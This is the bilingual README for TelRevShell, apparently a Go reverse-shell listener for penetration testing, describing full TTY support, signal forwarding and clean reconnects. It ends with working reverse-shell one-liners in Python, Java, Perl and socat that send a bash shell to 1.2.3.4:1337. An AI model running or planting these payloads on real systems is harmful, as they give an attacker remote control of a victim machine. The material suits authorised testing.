# TelRevShell

🚀 一个类 Telnet 风格的 交互式反弹Shell 服务端，支持交互控制、命令模式和跨平台运行，基于 Go 编写。

🚀 A telnet-style interactive reverse shell server with escape command mode, cross-platform support, and interactive terminal control – built with Go

---

## Features / 功能特点:

- 🖥️ Cross-platform support (Linux, Windows, macOS) / 跨平台支持
- ⌨️ Interactive terminal with raw mode handling / 原生终端交互体验
- 🎛️ Escape key based command-mode (Ctrl+]) / 支持类 Telnet 快捷键命令模式（Ctrl+]）
- 🔄 Auto-reconnect and force-exit support / 支持断开重连与强制退出操作

---

If you encounter the following problems during pentesting / 如果你在渗透测试时遇到这些问题

- Some commands, like `apt` and `ssh` require a proper terminal to run / 一些指令像 `apt` 和 `ssh` 需要一个真终端才能运行.
- STDERR usually isn’t displayed / 看不到STDERR
- Can’t properly use text editors like `vim` / 不能使用vim等编辑器
- No tab-complete / 没有Tab补全
- No up arrow history / 不能使用PgUP查看历史指令
- No job control / 没有Job Control
- No color / 没有颜色

## When traditional reverse shells fail you... / 当传统反连Shell不够用时...

In many real-world pentesting scenarios, you end up getting back a very limited or *dumb shell*. These shells often lack interactivity and have broken terminal behaviors.

在真实的渗透测试中，我们常常只能拿到一个非常“原始”的 *哑shell*。这些shell通常交互性差，终端行为异常。

For example:

- `nc` listener doesn't support terminal input signals, so you can't use `Ctrl+C` or `Ctrl+Z`
- `nc`监听时不支持输入信号，无法 `Ctrl+C`、`Ctrl+Z` 终止程序或挂起后台任务

- `socat` sometimes fails to release the port when forcefully terminated, causing `bind: address already in use` errors on restart
- `socat` 一旦强行结束后会出现端口未释放问题，重启时显示 `bind: address already in use`

- You may end up killing your listener or locking yourself out if the shell crashes
- 一旦远程Shell崩溃，你可能直接断连且端口仍被占用，无法恢复监听

---

## TelRevShell tries to fix that

**TelRevShell** is a Go-based reverse shell listener/server that behaves like Telnet, offering a persistent, interactive terminal interface.

**TelRevShell** 是一个类Telnet风格的反向Shell服务器，使用Go编写，支持「持久连接 + 真终端 + 命令控制」。

- A full TTY experience (arrow keys, colors, editors like `vim`)
  - 全TTY体验（方向键、颜色、支持`vim`等编辑器）

- Ctrl+C works (SIGINT forwarded)
  - 支持 `Ctrl+C` 发送SIGINT中断

- Escape key command-mode (`^]`) lets you drop into control
  - 快捷键 `Ctrl+]` 进入命令模式，可随时查看状态或安全退出

- Clean shutdown and reconnect logic
  - 支持清理退出，优雅等待客户端重连

- Port reliably released after disconnection
  - 解除绑定后端口自动释放，无需手动kill进程

---

## interactive revshell examples / 交互式反弹shell样例

Python3: 

```python3
import socket,subprocess,os,pty;s=socket.socket();s.connect(("1.2.3.4",1337));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")
```

Java:

```java
import java.io.*;import java.net.*;class R{public static void main(String[] a)throws Exception{Socket s=new Socket("1.2.3.4",1337);Process p=new ProcessBuilder("/bin/bash").redirectErrorStream(true).start();InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);}}}
```

Perl:

```perl
use Socket;$i="1.2.3.4";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};
```

Socat:

```bash
socat TCP:1.2.3.4:1337 EXEC:"/bin/bash",pty,stderr,sigint,sane
```

